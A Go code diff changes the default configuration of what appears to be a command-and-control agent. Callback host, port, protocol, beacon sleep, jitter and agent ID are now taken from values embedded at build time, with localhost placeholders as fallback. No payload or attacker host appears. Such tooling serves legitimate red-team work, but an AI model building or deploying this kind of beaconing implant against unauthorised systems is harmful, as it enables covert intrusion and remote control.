@@ -30,24 +30,61 @@ type AgentConfig struct {
 
 // DefaultConfig returns a configuration with sensible default values
 func DefaultConfig() *AgentConfig {
-	return &AgentConfig{
-		// Default to localhost for testing
-		TargetHost: "localhost",
-		TargetPort: 7777, // Default to HTTP/1.1 port from the server
-		Protocol:   types.H1C,
-
-		// Connection timeouts
-		ConnectionTimeout: 2 * time.Minute,  // 2 minutes to establish connection
-		RequestTimeout:    1 * time.Minute,  // 1 minute for request completion
-		ReconnectDelay:    10 * time.Minute, // 10 minutes before attempting reconnection
-
-		// Operational behavior
-		Sleep:  30 * time.Second, // Check in every minute by default
-		Jitter: 20.0,             // 20% jitter - vary sleep time by up to 20%
-
-		// Identity - this will be overridden by the build process
-		AgentUUID: "00000000-0000-0000-0000-000000000000",
+	cfg := &AgentConfig{
+		// Use embedded values if they're not placeholders
+		TargetHost:        EmbeddedValues.TargetHost,
+		TargetPort:        EmbeddedValues.TargetPort,
+		ConnectionTimeout: 2 * time.Minute,
+		RequestTimeout:    1 * time.Minute,
+		ReconnectDelay:    10 * time.Second,
+		AgentUUID:         EmbeddedValues.AgentUUID,
 	}
+
+	// Set Protocol based on embedded string
+	if EmbeddedValues.Protocol != "PLACEHOLDER_PROTOCOL" {
+		switch EmbeddedValues.Protocol {
+		case "H1C":
+			cfg.Protocol = types.H1C
+		case "H1TLS":
+			cfg.Protocol = types.H1TLS
+		case "H2C":
+			cfg.Protocol = types.H2C
+		case "H2TLS":
+			cfg.Protocol = types.H2TLS
+		case "H3":
+			cfg.Protocol = types.H3
+		}
+	} else {
+		cfg.Protocol = types.H1C
+	}
+
+	// Set Sleep and Jitter
+	if EmbeddedValues.Sleep != 0 {
+		cfg.Sleep = time.Duration(EmbeddedValues.Sleep) * time.Second
+	} else {
+		cfg.Sleep = 10 * time.Second
+	}
+
+	if EmbeddedValues.Jitter != 0 {
+		cfg.Jitter = float64(EmbeddedValues.Jitter)
+	} else {
+		cfg.Jitter = 50.0
+	}
+
+	// Use default values for anything that's still a placeholder
+	if cfg.TargetHost == "PLACEHOLDER_HOST" {
+		cfg.TargetHost = "localhost"
+	}
+
+	if cfg.TargetPort == 0 {
+		cfg.TargetPort = 7777
+	}
+
+	if cfg.AgentUUID == "PLACEHOLDER_UUID" {
+		cfg.AgentUUID = "00000000-0000-0000-0000-000000000000"
+	}
+
+	return cfg
 }
 
 // CalculateSleepWithJitter returns the sleep duration with jitter applied
